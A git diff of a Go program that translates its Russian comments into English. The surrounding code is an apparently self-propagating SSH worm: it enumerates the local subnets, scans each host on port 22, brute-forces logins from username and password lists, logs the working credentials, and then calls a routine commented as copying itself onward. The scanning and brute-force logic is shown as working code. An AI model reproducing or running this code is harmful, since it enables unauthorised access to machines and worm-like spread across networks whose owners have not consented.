@@ -20,19 +20,19 @@ var (
 )
 
 func main() {
-	// какая подсеть
+	// which subnet
 	netIP := myNet()
 	for _, ip := range netIP {
 		log.Println("network ", ip)
 	}
 
-	// поиск хостов
+	// search for hosts
 	allHost := searchHosts(netIP)
 	for _, ssh := range allHost {
 		log.Println("host ", ssh)
 	}
 
-	// подбор пароля
+	// password selection
 	for _, sshHost := range allHost {
 
 		for _, us := range username {
@@ -56,7 +56,7 @@ func main() {
 
 				log.Println("login: ", us, "password: ", pas, " OK")
 
-				// копирование и ДАЛЬШЕ
+				// copying and ON
 				doIt(client)
 
 				break
@@ -65,7 +65,7 @@ func main() {
 	}
 }
 
-// поиск подсетей
+// subnetting
 func myNet() []string {
 	addrs, err := net.InterfaceAddrs()
 	if err != nil {
@@ -92,7 +92,7 @@ func myNet() []string {
 	return result
 }
 
-// поиск хостов
+// search for hosts
 func searchHosts(netIP []string) []string {
 	allHosts := make([]string, 0)
 
@@ -102,7 +102,7 @@ func searchHosts(netIP []string) []string {
 		for i := 1; i < 254; i++ {
 			conn, err := net.DialTimeout("tcp", host+strconv.Itoa(i)+":"+"22", time.Duration(1)*time.Millisecond)
 			if err == nil {
-				// отправка текста
+				// sending text
 				fmt.Fprintf(conn, "HELLO\r\n")
 				buf := make([]byte, 0, 4096) // big buffer
 				tmp := make([]byte, 256)     // using small tmo buffer for demonstrating
